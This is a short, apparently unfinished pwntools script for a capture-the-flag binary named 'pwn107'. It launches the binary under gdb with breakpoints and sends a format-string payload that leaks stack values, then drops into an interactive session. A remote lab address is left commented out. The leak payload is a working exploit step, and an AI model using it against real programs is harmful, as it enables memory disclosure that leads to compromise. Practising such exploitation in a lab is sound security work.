
from pwn import *

#context.log_level = "debug"


p = process('./pwn107')
#p = remote('10.10.127.226', 9006)

gdb.attach(p, '''
set follow-fork-mode child
break execve
continue
''')

gdb.debug(p,'''
           break _start
           continue
           b*main
           break *main+220
           ''')
p.sendline(b'%6$p-%7$p-%8$p-%9$p-%10$p-%11$p-%12$p')



#p.recv()

recv = p.recv()

#recv = str(recv).split(' ')[-1].strip("'").split('-')

print(recv)

x = lambda y : bytes.fromhex(y)[::-1]
p.interactive()
